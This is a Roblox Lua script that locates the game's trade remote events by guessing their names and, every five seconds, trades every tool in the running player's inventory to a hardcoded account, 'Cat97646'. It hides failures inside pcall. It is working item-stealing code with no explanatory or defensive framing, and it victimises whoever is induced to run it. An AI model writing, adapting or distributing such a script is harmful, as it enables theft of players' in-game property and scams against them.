local player = game:GetService("Players").LocalPlayer
local rs = game:GetService("ReplicatedStorage")

repeat wait() until player.Character and player.Character:FindFirstChild("HumanoidRootPart")

local targetName = "Cat97646"

local function findRemote(name)
    for _, v in ipairs(rs:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            if v.Name:lower():find(name:lower()) then
                return v
            end
        end
    end
    return nil
end

local tradeRequest = findRemote("TradeRequest") or findRemote("RequestTrade") or findRemote("SendTrade")
local tradeAccept = findRemote("TradeAccept") or findRemote("AcceptTrade")
local tradeConfirm = findRemote("TradeConfirm") or findRemote("ConfirmTrade")
local addItem = findRemote("AddItem") or findRemote("TradeAddItem") or findRemote("AddItemToTrade")

local function getItems()
    local items = {}
    for _, v in ipairs(player.Backpack:GetChildren()) do
        if v:IsA("Tool") then
            table.insert(items, v.Name)
        end
    end
    if player.Character then
        for _, v in ipairs(player.Character:GetChildren()) do
            if v:IsA("Tool") then
                table.insert(items, v.Name)
            end
        end
    end
    return items
end

local function getTarget()
    for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
        if p.Name == targetName and p ~= player and p.Character then
            return p
        end
    end
    return nil
end

task.spawn(function()
    while wait(5) do
        pcall(function()
            local target = getTarget()
            if target and tradeRequest then
                tradeRequest:FireServer(target)
                wait(1)
                if tradeAccept then
                    tradeAccept:FireServer()
                end
                wait(0.5)
                for _, item in ipairs(getItems()) do
                    if addItem then
                        addItem:FireServer(item)
                    end
                    wait(0.2)
                end
                wait(0.5)
                if tradeConfirm then
                    tradeConfirm:FireServer()
                end
            end
        end)
    end
end)
